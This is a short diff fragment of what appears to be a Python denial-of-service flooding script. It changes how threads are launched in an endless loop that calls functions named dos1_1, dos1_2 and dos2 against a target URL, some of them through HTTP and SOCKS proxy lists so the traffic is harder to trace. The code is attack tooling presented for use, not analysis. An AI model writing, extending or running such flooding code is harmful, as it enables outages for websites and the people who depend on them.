@@ -151,9 +151,9 @@ if proxyuseage == 1:
     threading.Thread(target=info)
     while True:
         for number_socks in proxy_http:
-            threading.Thread(target=dos1_1, args=(url, number_socks, packet)).start()
+            threading.Thread(target=dos1_1, args=(url, number_socks,)).start()
         for number_http in proxy_socks:
-            threading.Thread(target=dos1_2, args=(url, number_http, packet)).start()
+            threading.Thread(target=dos1_2, args=(url, number_http,)).start()
 else:
     while True:
         threading.Thread(target=dos2, args=(url,)).start()
